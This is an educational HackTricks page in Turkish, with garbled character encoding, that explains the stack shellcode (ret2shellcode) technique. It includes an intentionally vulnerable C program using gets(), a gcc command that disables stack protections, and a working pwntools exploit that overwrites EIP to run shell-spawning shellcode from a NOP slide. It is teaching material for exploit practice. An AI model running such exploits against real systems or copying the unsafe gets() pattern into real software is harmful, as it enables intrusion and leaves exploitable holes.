# Stack Shellcode

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Temel Bilgiler

**Stack shellcode**, bir saldÄ±rganÄ±n bir zayÄ±f programÄ±n yÄ±ÄŸÄ±nÄ±nda shellcode yazdÄ±ÄŸÄ± ve ardÄ±ndan **Instruction Pointer (IP)** veya **Extended Instruction Pointer (EIP)**'yi bu shellcode'un konumuna iÅŸaret edecek ÅŸekilde deÄŸiÅŸtirdiÄŸi bir ikili istismar tekniÄŸidir. Bu, yetkisiz eriÅŸim saÄŸlamak veya hedef sistemde rastgele komutlar Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±lan klasik bir yÃ¶ntemdir. Ä°ÅŸte sÃ¼recin bir analizi, basit bir C Ã¶rneÄŸi ve buna karÅŸÄ±lÄ±k gelen bir istismar yazmanÄ±n nasÄ±l olabileceÄŸi, **pwntools** kullanarak.

### C Ã–rneÄŸi: ZayÄ±f Bir Program

ZayÄ±f bir C programÄ±nÄ±n basit bir Ã¶rneÄŸiyle baÅŸlayalÄ±m:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
Bu program, `gets()` fonksiyonunun kullanÄ±mÄ± nedeniyle bir buffer overflow'a karÅŸÄ± savunmasÄ±zdÄ±r.

### Derleme

Bu programÄ± Ã§eÅŸitli korumalarÄ± devre dÄ±ÅŸÄ± bÄ±rakarak (savunmasÄ±z bir ortam simÃ¼le etmek iÃ§in) derlemek iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-fno-stack-protector`: YÄ±ÄŸÄ±n korumasÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakÄ±r.
* `-z execstack`: YÄ±ÄŸÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±labilir hale getirir, bu da yÄ±ÄŸÄ±nda saklanan shellcode'un Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± iÃ§in gereklidir.
* `-no-pie`: Konumdan baÄŸÄ±msÄ±z Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyayÄ± devre dÄ±ÅŸÄ± bÄ±rakÄ±r, bu da shellcode'un nerede bulunacaÄŸÄ±nÄ± tahmin etmeyi kolaylaÅŸtÄ±rÄ±r.
* `-m32`: ProgramÄ± 32-bit Ã§alÄ±ÅŸtÄ±rÄ±labilir olarak derler, genellikle exploit geliÅŸtirmede basitlik iÃ§in kullanÄ±lÄ±r.

### Python Exploit using Pwntools

Ä°ÅŸte **pwntools** kullanarak **ret2shellcode** saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in Python'da bir exploit yazmanÄ±n yolu:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
Bu script, bir **NOP kaydÄ±rma**, **shellcode** ve ardÄ±ndan **EIP**'yi NOP kaydÄ±rmaya iÅŸaret eden adresle yazan bir yÃ¼k oluÅŸturur, bÃ¶ylece shellcode'un Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± saÄŸlar.

**NOP kaydÄ±rma** (`asm('nop')`), yÃ¼rÃ¼tmenin tam adrese bakÄ±lmaksÄ±zÄ±n shellcode'umuza "kaymasÄ±nÄ±" saÄŸlama ÅŸansÄ±nÄ± artÄ±rmak iÃ§in kullanÄ±lÄ±r. `p32()` argÃ¼manÄ±nÄ±, tamponunuzun baÅŸlangÄ±Ã§ adresine artÄ± bir offset ekleyerek NOP kaydÄ±rmasÄ±na ulaÅŸacak ÅŸekilde ayarlayÄ±n.

## Koruma Ã–nlemleri

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **devre dÄ±ÅŸÄ± bÄ±rakÄ±lmalÄ±dÄ±r** ki adres, yÃ¼rÃ¼tmeler arasÄ±nda gÃ¼venilir olsun veya fonksiyonun saklanacaÄŸÄ± adres her zaman aynÄ± olmayacak ve kazanma fonksiyonunun nerede yÃ¼klÃ¼ olduÄŸunu anlamak iÃ§in bir leak'e ihtiyacÄ±nÄ±z olacak.
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/) da devre dÄ±ÅŸÄ± bÄ±rakÄ±lmalÄ±dÄ±r yoksa ele geÃ§irilmiÅŸ EIP dÃ¶nÃ¼ÅŸ adresi asla takip edilmeyecektir.
* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md) **stack** korumasÄ±, bu bÃ¶lge yÃ¼rÃ¼tÃ¼lebilir olmadÄ±ÄŸÄ±ndan shellcode'un stack iÃ§inde Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± engelleyecektir.

## DiÄŸer Ã–rnekler ve Referanslar

* [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
* [https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html)
* 64bit, stack adres leak ile ASLR, shellcode yaz ve ona atla
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html)
* 32 bit, stack leak ile ASLR, shellcode yaz ve ona atla
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html)
* 32 bit, stack leak ile ASLR, exit() Ã§aÄŸrÄ±sÄ±nÄ± Ã¶nlemek iÃ§in karÅŸÄ±laÅŸtÄ±rma, bir deÄŸiÅŸkeni bir deÄŸerle yaz ve shellcode yaz ve ona atla

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
